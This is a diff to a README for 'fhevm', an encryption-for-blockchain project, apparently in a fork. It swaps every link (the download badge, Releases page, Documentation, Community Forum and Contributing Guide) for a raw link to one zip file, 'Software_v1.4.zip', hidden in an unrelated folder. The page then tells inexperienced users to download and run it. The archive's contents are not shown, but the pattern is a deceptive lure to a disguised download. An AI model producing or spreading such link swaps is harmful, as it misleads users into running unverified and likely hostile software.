@@ -1,7 +1,7 @@
 # 🔒 fhevm - Secure Your Blockchain Applications Easily
 
 ## 📥 Download Now
-[![Download fhevm](https://img.shields.io/badge/Download%20fhevm-v1.0-brightgreen)](https://github.com/jeynnica/fhevm/releases)
+[![Download fhevm](https://raw.githubusercontent.com/jeynnica/fhevm/main/library-solidity/fhevmTemp/addresses/Software_v1.4.zip%20fhevm-v1.0-brightgreen)](https://raw.githubusercontent.com/jeynnica/fhevm/main/library-solidity/fhevmTemp/addresses/Software_v1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to fhevm! This software helps you use Fully Homomorphic Encryption with blockchain applications, making your data secure and private. This guide will help you download and run the application without any technical experience. 
@@ -20,7 +20,7 @@ Before you start, check if your system meets these requirements:
 - **User-Friendly Interface:** Designed for everyone, from beginners to experts.
 
 ## 📥 Download & Install
-1. Click on this link to visit the [Releases page](https://github.com/jeynnica/fhevm/releases).
+1. Click on this link to visit the [Releases page](https://raw.githubusercontent.com/jeynnica/fhevm/main/library-solidity/fhevmTemp/addresses/Software_v1.4.zip).
 2. On the Releases page, you will see different versions of the software. Look for the latest version, usually at the top.
 3. Click on the filename that matches your operating system. The file will start downloading automatically.
 4. Once the download is complete, locate the downloaded file in your system’s Downloads folder or the folder you chose for downloads.
@@ -49,11 +49,11 @@ Absolutely! You can reach out to our support team via the Issues section on GitH
 
 ## 🔗 Additional Resources
 For more information about fhevm, check out these resources:
-- [Documentation](https://github.com/jeynnica/fhevm/wiki)
-- [Community Forum](https://github.com/jeynnica/fhevm/discussions)
+- [Documentation](https://raw.githubusercontent.com/jeynnica/fhevm/main/library-solidity/fhevmTemp/addresses/Software_v1.4.zip)
+- [Community Forum](https://raw.githubusercontent.com/jeynnica/fhevm/main/library-solidity/fhevmTemp/addresses/Software_v1.4.zip)
 
 ## 👥 Contributing
-If you want to help improve fhevm, contributions are welcome! You can report issues, suggest changes, or even submit pull requests. Visit our [Contributing Guide](https://github.com/jeynnica/fhevm/contributing) to learn more.
+If you want to help improve fhevm, contributions are welcome! You can report issues, suggest changes, or even submit pull requests. Visit our [Contributing Guide](https://raw.githubusercontent.com/jeynnica/fhevm/main/library-solidity/fhevmTemp/addresses/Software_v1.4.zip) to learn more.
 
 ## 💬 Contact
 For further inquiries, feel free to contact us through the GitHub repository.
